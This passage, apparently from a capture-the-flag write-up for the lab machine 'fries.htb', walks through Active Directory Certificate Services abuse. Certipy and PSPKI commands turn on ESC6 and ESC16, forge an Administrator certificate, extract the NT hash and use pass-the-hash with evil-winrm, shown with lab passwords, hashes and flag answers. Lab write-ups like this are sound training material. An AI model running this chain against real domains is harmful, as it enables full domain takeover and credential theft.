[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fries-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fries-DC01-CA'
[*] Checking web enrollment for CA 'fries-DC01-CA' @ 'DC01.fries.htb'
[*] Saving text output to '20251126121700_Certipy.txt'
[*] Wrote text output to '20251126121700_Certipy.txt'
[*] Saving JSON output to '20251126121700_Certipy.json'
[*] Wrote JSON output to '20251126121700_Certipy.json'
```

We have generated several files that we investigate.

### Configuration for `ESC7` to `ESC6`

We find that `ESC7` is the one we are interested in:

```
[!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
```

Now we can pivot from `ESC7` to `ESC6`.

URL = [ESC7 to ESC6 Configuration](https://www.thehacker.recipes/ad/movement/adcs/access-controls#esc7-exposing-to-esc6)

```powershell
Import-Module PSPKI
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
$configReader.SetRootNode($true)
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

We import the necessary module and enable the `template`. Then we verify it:

```powershell
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

Info:

```
1376590
```

It is correctly enabled with the number `1376590`.

### Enable `ESC16` to Disable Security

Now we add the OID extension `1.3.6.1.4.1.311.25.2` to the list of disabled extensions to enable `ESC16`.

> Extra Information

The `ESC16` vulnerability occurs when a Certificate Authority (CA) is configured to disable the inclusion of OID `1.3.6.1.4.1.311.25.2` (the security extension) in all certificates it issues, or if the `KB5014754` patch has not been applied. This makes the `CA` behave as if all its published templates were vulnerable to the `ESC9` vector.

```powershell
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
$configReader.SetRootNode($true)
$ConfigReader.SetConfigEntry("1.3.6.1.4.1.311.25.2", "DisableExtensionList", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

We verify this as follows:

```shell
certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <IP> -vulnerable -stdout
```

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fries-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fries-DC01-CA'
[*] Checking web enrollment for CA 'fries-DC01-CA' @ 'DC01.fries.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fries-DC01-CA
    DNS Name                            : DC01.fries.htb
    Certificate Subject                 : CN=fries-DC01-CA, DC=fries, DC=htb
    Certificate Serial Number           : 26117C1FFA5705AF443B7E82E8C639A9
    Certificate Validity Start          : 2025-11-18 05:39:18+00:00
    Certificate Validity End            : 3024-05-19 14:11:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FRIES.HTB\Administrators
      Access Rights
        ManageCa                        : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
        ManageCertificates              : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
        Enroll                          : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Users
                                          FRIES.HTB\Domain Computers
                                          FRIES.HTB\Authenticated Users
    [+] User Enrollable Principals      : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Users
                                          FRIES.HTB\Authenticated Users
                                          FRIES.HTB\Domain Computers
    [+] User ACL Principals             : FRIES.HTB\gMSA_CA_prod
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
      ESC6                              : Enrollee can specify SAN.
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

### ESC6 Exploitation

Now we `exploit` the `ESC6` vulnerability:

URL = [Privilege Escalation ESC6](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc6-ca-allows-san-specification-via-request-attributes)

```shell
certipy-ad req -u "svc_infra" -p "m6tneOMAh5p0wQ0d" -dc-ip "<IP>" -ca 'fries-DC01-CA' -template 'User' -upn 'administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500'
```

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 53
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fries.htb'
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

The certificate is correctly generated and authenticated as the `Administrator`. We use it to authenticate and obtain the `Administrator's` `Hash`.

> Get the `Administrator's` `SID`

```powershell
Get-ADUser Administrator
```

```shell
ntpdate fries.htb ; certipy-ad auth -pfx "administrator.pfx" -dc-ip '<IP>' -username 'Administrator' -domain 'fries.htb'
```

Info:

```
2025-11-27 11:14:06.774696 (-0800) +2178.775048 +/- 0.013958 fries.htb 10.10.11.96 s1 no-leap
CLOCK: time stepped by 2178.775048
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@fries.htb'
[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Using principal: 'administrator@fries.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

It worked, and we correctly obtained the `hash`. We perform a `Pass-The-Hash` with `evil-winrm`.

### evil-winrm (Administrator)

```shell
evil-winrm -i <IP> -u 'Administrator' -H a773cb05d79273299a684a23ede56748
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fries\administrator
```

We are logged in as `Administrator`. We read the `2` flags, `user.txt` and `root.txt`.

> root.txt

```
2ce93f877c167a8e1ca7dfa6baffad2a
```

> user.txt

```
7fdd8a52dba09f85547ef0f353103627
```
```
